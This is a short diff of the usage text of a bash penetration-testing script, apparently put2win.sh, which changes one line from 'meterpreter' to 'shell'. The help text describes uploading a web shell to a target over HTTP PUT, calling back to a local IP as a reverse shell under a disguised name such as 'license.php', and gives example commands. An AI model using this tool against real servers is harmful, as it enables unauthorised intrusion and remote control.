@@ -30,7 +30,7 @@ echo -e "		   		    @devploit${NOCOLOR}"
  
 # --- usage ---
 display_usage() { 
-	echo -e "\nThis script automatize shell upload by PUT HTTP method to get meterpreter." 
+	echo -e "\nThis script automatize shell upload by PUT HTTP method to get shell." 
 	echo -e "\nOptions:\n  -t TARGET        Target URL/IP (e.g. "192.168.1.10") \n  -p PORT          Target PORT (e.g. "8080") \n  -u URL PATH      Path to save the shell (e.g. "/uploads")  \n  -l LOCAL IP      IP where the shell will connect (e.g. "192.168.1.5") \n  -s SHELL NAME    Shell name (e.g. "license.php")" 
 	echo -e "\nExamples of use:\n - ./put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10 -s readme.php"
 	echo -e " - ./put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10\n"
